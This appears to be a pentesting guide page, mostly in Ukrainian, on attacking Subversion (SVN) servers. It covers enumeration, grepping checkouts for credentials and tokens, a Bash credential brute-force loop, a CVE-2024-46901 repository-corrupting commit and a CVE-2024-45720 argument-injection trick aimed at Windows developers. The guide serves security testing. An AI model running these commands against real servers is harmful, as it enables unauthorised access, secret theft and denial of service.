# 3690/tcp - Pentesting Subversion (SVN) сервер

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

**Subversion (SVN)** — централізована **система контролю версій** (ліцензія Apache), що використовується для версіювання програмного забезпечення та контролю змін.

**Порт за замовчуванням:** `3690/tcp` (svnserve). Також може бути доступний через **HTTP/HTTPS** за допомогою `mod_dav_svn` та через **svn+ssh**.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Перерахування
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Auth & Misconfig Hunting

- `svnserve.conf` може дозволяти `anon-access = read` (or even write). Якщо ви можете перерахувати, спробуйте `checkout`, щоб витягти secrets, scripts, CI tokens.
- Репозиторії часто зберігають **build pipelines**, **deployment keys**, and **database credentials** у версіонованих config файлах. Grep the working copy after `checkout`: `grep -R "password\|secret\|token" -n .`.
- Якщо svn+ssh увімкнено, shell-и користувачів часто дозволяють виконувати обмежені `svnserve` команди; спробуйте `ssh user@host svnserve -t` з crafted subcommands, щоб обійти wrappers.

### Bruteforcing credentials (svnserve)

`sasl` аутентифікація (якщо увімкнена) і прості файли паролів захищені лише транспортом; за замовчуванням немає блокувань. Швидкий Bash-цикл може перебрати облікові дані:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## Останні вразливості (практичний вплив)

### mod_dav_svn DoS через керуючі символи (CVE-2024-46901)

- Користувач з правами коміту може записати шлях, що містить керуючі символи (наприклад `\x01`, `\x7f`), які **пошкоджують репозиторій**, викликаючи помилки при подальших checkouts/логах і потенційно спричиняючи краш воркерів `mod_dav_svn`.
- Впливає на Subversion ≤ **1.14.4** при обслуговуванні через **HTTP(S)** (`mod_dav_svn`). Виправлено в **1.14.5**.
- PoC коміт через `svnmucc` (потребує дійсних облікових даних для коміту):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- Після коміту звичайні клієнти можуть аварійно закриватися або відмовлятися від оновлень, поки адміністратори вручну не видалять ревізію за допомогою `svnadmin dump/filter/load`.

### Windows argument injection in svn client (CVE-2024-45720)

- На Windows "best-fit" character encoding у `svn.exe` дозволяє **command-line argument injection** при обробці спеціально сформованих non‑ASCII шляхів/URL, що потенційно призводить до виконання довільних програм.
- Торкається Subversion ≤ **1.14.3** лише на Windows; виправлено в **1.14.4**. Attack surface: phishing a developer to run `svn` on an attacker-controlled URL/path.
- Pentest angle: якщо ви контролюєте network share або ZIP, який передають Windows-розробнику, назвіть URL репозиторію або шлях робочої копії так, щоб він містив best-fit байти, які декодуються в `" & calc.exe & "`-подібні інжектовані аргументи, а потім обдуріть жертву, щоб вона запустила `svn status` або подібну команду на цьому шляху.

## Notes for Exploitation Workflow

1. Check access method: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn), or `svn+ssh://`.
2. Try anonymous read first; then spray common creds. If HTTP Basic is used, reuse creds found elsewhere.
3. Enumerate hooks: `hooks/pre-commit`, `post-commit` scripts іноді містять plaintext credentials або імена хостів.
4. Leverage `svn:externals` щоб витягнути додаткові шляхи з інших хостів; перелічити їх можна за допомогою `svn propget svn:externals -R .` після checkout.
5. Version leaks: HTTP response headers від `mod_dav_svn` зазвичай показують версії Subversion і Apache; порівняйте з 1.14.5, щоб виявити вразливі цілі.
6. Якщо ви отримаєте доступ до файлової системи репозиторію, `svnadmin dump`/`svnlook author`/`svnlook dirs-changed` дозволяють виконувати офлайн-аналіз без облікових даних.



## References

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
